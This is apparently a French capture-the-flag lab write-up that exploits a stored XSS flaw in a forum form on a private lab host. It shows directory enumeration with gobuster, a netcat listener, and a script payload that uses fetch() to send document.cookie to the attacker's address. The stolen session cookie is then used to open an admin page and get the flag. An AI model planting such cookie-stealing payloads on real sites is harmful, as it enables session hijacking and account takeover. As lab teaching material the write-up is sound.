# XSS

### Recherche de XSS

On a un formulaire `http://192.168.56.10/xss/`
On remarque avec un simple payload qu'une XSS est possible

```html
<script>alert("Salut l'équipe")</script>
```

En cliquant sur preview on a bien le code qui s'exécute

### Scan

On va chercher à scanner le site pour trouver des choses intéressantes qu'on peut faire avec cet XSS, sachant qu'on peut potentiellement avec cet XSS subtiliser les cookies de sessions PHP présent dans la variable usuelle `document.cookie`

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://192.168.56.10/xss -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.10/xss
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/img                  (Status: 301) [Size: 316] [--> http://192.168.56.10/xss/img/]
/index.php            (Status: 200) [Size: 1463]
/admin.php            (Status: 200) [Size: 330]
```

On trouve la page admin.php qui nous met un access denied lors de la consultation

On va donc chercher à voler tout les cookies possible en posant une XSS dans le forum, pour que si jamais un membre du staff passe par la on puisse prendre son cookie de session et accéder à admin.php.

On va écouter localement sur le port 80 pour se préparer à recevoir un cookie
```bash
nc -nvlp 80
```

Et on va poser le payload XSS suivant sur la machine web
```html
<script>
fetch('http://192.168.56.3/?cookies='+document.cookie)
</script>
```

On remarque avec la preview que cela fonctionne
```bash
nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.56.3] from (UNKNOWN) [192.168.56.3] 51348
GET /?cookies=PHPSESSID=n3goad6knpm3lhmfjj2qo5j11b HTTP/1.1
Host: 192.168.56.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.56.10/
Origin: http://192.168.56.10
Connection: close
```

On le soumet et on reçoit au bout d'un instant le cookie suivant
```js
PHPSESSID=oonahFiesh5Aekoefieshi3mae0oqu3i
```

On peut essayer de se connecter à admin.php avec ce cookie, et on trouve le flag suivant `flag{C00k1eS_4r3_D3Lic10uS!}`